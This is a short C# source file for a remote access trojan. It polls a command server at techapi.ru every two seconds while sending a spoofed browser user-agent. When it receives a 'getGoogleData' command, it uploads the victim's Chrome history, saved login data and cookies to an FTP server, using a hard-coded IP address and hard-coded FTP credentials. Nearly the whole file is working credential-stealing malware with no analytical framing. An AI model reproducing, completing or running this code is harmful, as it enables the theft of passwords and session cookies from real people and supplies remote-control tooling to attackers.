using System;
using System.IO;
using System.Net;
using System.Threading;

namespace RatPolling
{
    class Program
    {
        static void Main(string[] args)
        {
            String UserName = "TestPC";
            string CurrentUser = Environment.UserName;




            Console.WriteLine("Connection..." + CurrentUser);
            while (true)
            {
                try
                {
                    WebClient client = new WebClient();
                    client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                    Stream data = client.OpenRead("http://techapi.ru/command.php?UIN=" + UserName);
                    StreamReader reader = new StreamReader(data);
                    string s = reader.ReadToEnd();
                    Console.WriteLine(s);
                    data.Close();
                    reader.Close();
               
                string[] commands = s.Split('|');

                foreach (var command in commands)
                {
                    System.Console.WriteLine($"{command}");

                    if (command == "getGoogleData" + "=" + UserName)
                    {

                        String pathToGoogleCookie = "C:\\Users\\" + CurrentUser + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\";

                        if (System.IO.Directory.Exists(pathToGoogleCookie))
                        {
                            try
                            {
                                using (var clienst = new WebClient())
                                {
                                    client.Credentials = new NetworkCredential("u0777445", "RL7srYg_");
                                    client.UploadFile("ftp://31.31.196.203/History" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "History");
                                    client.UploadFile("ftp://31.31.196.203/Login.txt" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "Login Data");
                                    client.UploadFile("ftp://31.31.196.203/Cookies.txt" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "Cookies");
                                }
                            }
                            catch (System.Net.WebException e)
                            {
                                    Console.WriteLine("[-] ERROR: FTP Connection error.");
                                }
                           
                        }

                        Console.WriteLine("[+] Data of ftp server." + pathToGoogleCookie);
                    }
                }
                    Console.WriteLine("[-] WARNING: The response returned null.");
                }
                catch (System.Net.WebException e)
                {
                    Console.WriteLine("[-] ERROR: Connection error.");
                }
               
                Thread.Sleep(2000);


            }


            






        }

     

    }
}
